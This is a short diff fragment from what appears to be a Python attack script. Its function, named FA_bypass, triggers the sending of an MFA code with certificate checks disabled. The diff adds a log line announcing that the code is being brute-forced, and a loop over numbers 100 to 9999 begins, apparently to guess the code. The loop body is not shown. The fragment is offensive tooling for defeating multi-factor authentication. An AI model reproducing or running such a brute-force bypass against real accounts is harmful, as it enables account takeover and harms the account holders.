@@ -17,6 +17,7 @@ def FA_bypass(session,url):
 
     requests.get(fa_url,headers=headers,verify=False,proxies=proxie)
     print('(+) MFA-CODE SENT')
+    print('(+) Brute forcing MFA-CODE .....')
     ####
     
     for i in range(100,9999):
